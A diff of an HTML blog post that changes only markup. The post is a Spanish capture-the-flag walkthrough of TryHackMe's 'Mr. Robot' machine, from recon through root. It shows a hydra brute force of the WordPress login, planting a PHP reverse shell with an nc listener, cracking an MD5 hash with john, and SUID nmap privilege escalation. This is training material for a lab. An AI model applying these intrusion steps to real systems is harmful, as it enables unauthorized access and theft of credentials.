@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/mrrobot/00inicio.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la maquina <code class="highlighter-rouge">Mr. Robot</code> de <a href="https://tryhackme.com/">TryHackMe</a>.
+En esta ocasión vamos a resolver de la maquina <code class="language-plaintext highlighter-rouge">Mr. Robot</code> de <a href="https://tryhackme.com/">TryHackMe</a>.
 La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">mrrobot</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">mrrobot</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mkhack mrrobot
 ❯ <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.235.157 | <span class="nb">grep </span>ttl | <span class="nb">awk</span> <span class="s1">'{print $4 $6}'</span>
 10.10.235.157:ttl<span class="o">=</span>63
@@ -36,7 +36,7 @@ La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú
 443/tcp open  https
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p80</span>,443 <span class="nt">-sCV</span> 10.10.235.157 <span class="nt">-oN</span> allInfo
 Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-19 18:20 <span class="nt">-05</span>
@@ -55,9 +55,9 @@ PORT    STATE SERVICE  VERSION
 |_Not valid after:  2025-09-13T10:45:03
 </code></pre></div></div>
 
-<p>Podemos identificar que el puerto <code class="highlighter-rouge">80</code> tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión.</p>
+<p>Podemos identificar que el puerto <code class="language-plaintext highlighter-rouge">80</code> tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/mrrobot/01pagina.png" />
 </p>
 
@@ -73,14 +73,14 @@ ID           Response   Lines    Word       Chars       Payload
 000000679:   200        156 L    27 W       309 Ch      <span class="s2">"license"</span>
 000001765:   200        3 L      4 W        41 Ch       <span class="s2">"robots"</span>
 </code></pre></div></div>
-<p>Iniciamos con el directorio <code class="highlighter-rouge">robots</code>.</p>
+<p>Iniciamos con el directorio <code class="language-plaintext highlighter-rouge">robots</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s2">"http://10.10.235.157/robots.txt"</span>
 User-agent: <span class="k">*</span>
 fsocity.dic
 key-1-of-3.txt
 </code></pre></div></div>
-<p>¡Tenemos al parecer nuestra primera flag!, nuevamente con la utilidad <code class="highlighter-rouge">curl</code> vamos a realizar la petición para el recurso <strong>key-1-of-3.txt</strong></p>
+<p>¡Tenemos al parecer nuestra primera flag!, nuevamente con la utilidad <code class="language-plaintext highlighter-rouge">curl</code> vamos a realizar la petición para el recurso <strong>key-1-of-3.txt</strong></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s2">"http://10.10.235.157/key-1-of-3.txt"</span> <span class="o">&gt;</span> flag1.txt | <span class="nb">head</span> <span class="nt">-c</span> 10
 073403c8a5%
@@ -102,13 +102,13 @@ key-1-of-3.txt
 
 <p>Vamos a explorar la ruta wp-login, la cual muestra un panel de loggeo en un gestor de contenido como lo es <strong>Wordpress</strong>.</p>
 
-<p align="center">
+<p style="text-align: center;">
   <img src="/assets/images/mrrobot/02login.png" />
  </p>
 
-<p>Vamos a realizar un ataque de fuerza bruta por la utilidad <code class="highlighter-rouge">hydra</code>, pero antes de esto es necesario capturar la petición con <code class="highlighter-rouge">burpsuite</code>, para poder obtener los campos de usuario y contraseña que usaremos en nuestro ataque de fuerza bruta.</p>
+<p>Vamos a realizar un ataque de fuerza bruta por la utilidad <code class="language-plaintext highlighter-rouge">hydra</code>, pero antes de esto es necesario capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code>, para poder obtener los campos de usuario y contraseña que usaremos en nuestro ataque de fuerza bruta.</p>
 
-<p align="center">
+<p style="text-align: center;">
   <img src="/assets/images/mrrobot/03burp.png" />
  </p>
 
@@ -118,11 +118,11 @@ key-1-of-3.txt
 <span class="o">[</span>80][http-post-form] host: 10.10.235.157   login: elliot   password: <span class="nb">test</span>
 </code></pre></div></div>
 
-<p align="center">  
+<p style="text-align: center;">  
  <img src="/assets/images/mrrobot/04hydra1.png" />    
 </p>
 
-<p>¡Tenemos un usuario valido! Podemos ver que <code class="highlighter-rouge">elliot</code> es un usuario existente en este login.</p>
+<p>¡Tenemos un usuario valido! Podemos ver que <code class="language-plaintext highlighter-rouge">elliot</code> es un usuario existente en este login.</p>
 
 <p>Ahora intentaremos identificar la contraseña de este usuario para finalmente acceder al panel principal.</p>
 
@@ -130,7 +130,7 @@ key-1-of-3.txt
 <span class="o">[</span>80][http-post-form] host: 10.10.235.157   login: elliot   password: ER28-0652
 </code></pre></div></div>
 
-<p align="center">  
+<p style="text-align: center;">  
  <img src="/assets/images/mrrobot/05hydra2.png" />     
 </p>
 
@@ -139,19 +139,19 @@ key-1-of-3.txt
 <p>En este momento contamos con los permisos para editar archivos php en esta sesión, por lo que vamos a realizar los siguientes pasos:</p>
 
 <ul>
-  <li>Ir al panel izquierdo, opción <code class="highlighter-rouge">apperance</code>.</li>
-  <li>Click en la opción <code class="highlighter-rouge">editor</code>.</li>
-  <li>En el panel derecho, click en <code class="highlighter-rouge">archive.php</code>.</li>
+  <li>Ir al panel izquierdo, opción <code class="language-plaintext highlighter-rouge">apperance</code>.</li>
+  <li>Click en la opción <code class="language-plaintext highlighter-rouge">editor</code>.</li>
+  <li>En el panel derecho, click en <code class="language-plaintext highlighter-rouge">archive.php</code>.</li>
   <li>Copiamos la <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell</a> y la pegamos en el panel central.</li>
-  <li>Cambiamos la <code class="highlighter-rouge">IP</code> y <code class="highlighter-rouge">Puerto</code>.</li>
+  <li>Cambiamos la <code class="language-plaintext highlighter-rouge">IP</code> y <code class="language-plaintext highlighter-rouge">Puerto</code>.</li>
   <li>Guardamos cambios.</li>
 </ul>
 
-<p align="center">    
+<p style="text-align: center;">    
  <img src="/assets/images/mrrobot/06wp1.png" />     
 </p>
 
-<p>Con estos pasos vamos a generar una reverse shell en php para cargarla y después ejecutarla en la máquina, todo esto mientras estamos en escucha por con la utilidad <code class="highlighter-rouge">nc</code>.</p>
+<p>Con estos pasos vamos a generar una reverse shell en php para cargarla y después ejecutarla en la máquina, todo esto mientras estamos en escucha por con la utilidad <code class="language-plaintext highlighter-rouge">nc</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lvnp</span> 5555
 </code></pre></div></div>
@@ -161,20 +161,20 @@ key-1-of-3.txt
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s2">"http://10.10.235.157/wp-content/themes/twentyfifteen/archive.php"</span>
 </code></pre></div></div>
 
-<p align="center">  
+<p style="text-align: center;">  
  <img src="/assets/images/mrrobot/07reverse.png" />    
 </p>
 
 <p>##POST-EXPLOIT</p>
 
-<p>Ahora que tenemos acceso a la máquina, con la utilidad <code class="highlighter-rouge">find</code> buscamos el archivo que puede contener las siguientes flags.</p>
+<p>Ahora que tenemos acceso a la máquina, con la utilidad <code class="language-plaintext highlighter-rouge">find</code> buscamos el archivo que puede contener las siguientes flags.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>find / <span class="nt">-name</span> key-<span class="k">*</span><span class="nt">-of-3</span>.txt 2&gt;/dev/null
 /opt/bitnami/apps/wordpress/htdocs/key-1-of-3.txt
 /home/robot/key-2-of-3.txt
 </code></pre></div></div>
 
-<p>Ahora vamos a mirar los ficheros y sus permisos en el directorio <code class="highlighter-rouge">/home/robot</code>, detectando que la segunda flag solo la puede leer el usuario <code class="highlighter-rouge">robot</code>, existe un segundo archivo al cual si tenemos permiso al menos de lectura.</p>
+<p>Ahora vamos a mirar los ficheros y sus permisos en el directorio <code class="language-plaintext highlighter-rouge">/home/robot</code>, detectando que la segunda flag solo la puede leer el usuario <code class="language-plaintext highlighter-rouge">robot</code>, existe un segundo archivo al cual si tenemos permiso al menos de lectura.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/robot/
 total 16
@@ -184,13 +184,13 @@ drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
 <span class="nt">-rw-r--r--</span> 1 robot robot   39 Nov 13  2015 password.raw-md5
 </code></pre></div></div>
 
-<p>Vamos a leer el contenido del archivo <code class="highlighter-rouge">password.raw.md5</code>.</p>
+<p>Vamos a leer el contenido del archivo <code class="language-plaintext highlighter-rouge">password.raw.md5</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /home/robot/password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
 </code></pre></div></div>
 
-<p>¡Parece ser que tenemos un hash! Vamos a utilizar otro vector de ataque por fuerza bruta, esta vez con la utilidad <code class="highlighter-rouge">john</code>, pero antes de ello vamos a ingresar a la carpeta <strong>exploit</strong> y crear un fichero que contenga el hash identificado.</p>
+<p>¡Parece ser que tenemos un hash! Vamos a utilizar otro vector de ataque por fuerza bruta, esta vez con la utilidad <code class="language-plaintext highlighter-rouge">john</code>, pero antes de ello vamos a ingresar a la carpeta <strong>exploit</strong> y crear un fichero que contenga el hash identificado.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> ../exploit
 ❯ <span class="nb">echo</span> <span class="s2">"robot:c3fcd3d76192e4007dfb496cca67e13b"</span> <span class="o">&gt;</span> robot.hash
@@ -209,7 +209,7 @@ Session completed
 su: must be run from a terminal
 </code></pre></div></div>
 
-<p>Hay un problema, no podemos acceder por la utilidad <code class="highlighter-rouge">su</code>, sin embargo, verificando en la máquina, podemos ver que tiene <code class="highlighter-rouge">python 2.7.6</code> el cual nos va a permitir hacer el spawn de una shell en bash, luego de esto podremos ejecutar el comando para escalar privilegios con la contraseña previamente obtenida.</p>
+<p>Hay un problema, no podemos acceder por la utilidad <code class="language-plaintext highlighter-rouge">su</code>, sin embargo, verificando en la máquina, podemos ver que tiene <code class="language-plaintext highlighter-rouge">python 2.7.6</code> el cual nos va a permitir hacer el spawn de una shell en bash, luego de esto podremos ejecutar el comando para escalar privilegios con la contraseña previamente obtenida.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">--version</span>
 Python 2.7.6
@@ -220,7 +220,7 @@ Password: abcdefghijklmnopqrstuvwxyz
 robot@linux:
 </code></pre></div></div>
 
-<p>Como bien sabemos, ahora somos el usuario <code class="highlighter-rouge">robot</code>, con privilegios de lectura del fichero que contiene la segunda flag, así que procedemos a revisar su contenido.</p>
+<p>Como bien sabemos, ahora somos el usuario <code class="language-plaintext highlighter-rouge">robot</code>, con privilegios de lectura del fichero que contiene la segunda flag, así que procedemos a revisar su contenido.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:/<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-c</span> 10 /home/robot/key-2-of-3.txt
 <span class="nb">head</span> <span class="nt">-c</span> 10 /home/robot/key-2-of-3.txt
@@ -228,7 +228,7 @@ robot@linux:
 </code></pre></div></div>
 <p>##ESCALAMIENTO</p>
 
-<p>¡Perfecto! Ahora si vamos a revisar permisos por medio del comando <code class="highlighter-rouge">find</code>, así podremos ver qué tipo de utilidades puede ejecutar el usuario <code class="highlighter-rouge">robot</code> con privilegios.</p>
+<p>¡Perfecto! Ahora si vamos a revisar permisos por medio del comando <code class="language-plaintext highlighter-rouge">find</code>, así podremos ver qué tipo de utilidades puede ejecutar el usuario <code class="language-plaintext highlighter-rouge">robot</code> con privilegios.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
 find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
@@ -251,7 +251,7 @@ find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="
 /usr/lib/pt_chown
 </code></pre></div></div>
 
-<p>Vemos que <code class="highlighter-rouge">robot</code> puede ejecutar el comando <code class="highlighter-rouge">nmap</code> sin necesidad de ingresar credenciales.</p>
+<p>Vemos que <code class="language-plaintext highlighter-rouge">robot</code> puede ejecutar el comando <code class="language-plaintext highlighter-rouge">nmap</code> sin necesidad de ingresar credenciales.</p>
 
 <p>Por medio del recurso <a href="https://gtfobins.github.io/gtfobins/nmap/#shell">GTFOBins</a> identificamos una vía potencial de escalamiento de privilegios, ejecutando lo siguiente.</p>
 
@@ -267,7 +267,7 @@ Welcome to Interactive Mode <span class="nt">--</span> press h &lt;enter&gt; <sp
 
 <p>Esto fue posible debido a que la versión de nmap de la maquina era vulnerable, de igual manera la versión de python para spawnear la shell era compatible con lo que se requería.</p>
 
-<p>¡Logramos tener acceso a la maquina como <code class="highlighter-rouge">root</code>!</p>
+<p>¡Logramos tener acceso a la maquina como <code class="language-plaintext highlighter-rouge">root</code>!</p>
 
 <p>Solo hace falta buscar la flag correspondiente y eso sería todo.</p>
 
@@ -281,9 +281,9 @@ find / <span class="nt">-name</span> key-<span class="k">*</span><span class="nt
 04787ddef2
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la maquina <code class="highlighter-rouge">mr. robot</code> de TryHackMe!</p>
+<p>¡Hemos logrado completar la maquina <code class="language-plaintext highlighter-rouge">mr. robot</code> de TryHackMe!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/mrrobot/finish.png" />
 </p>
 
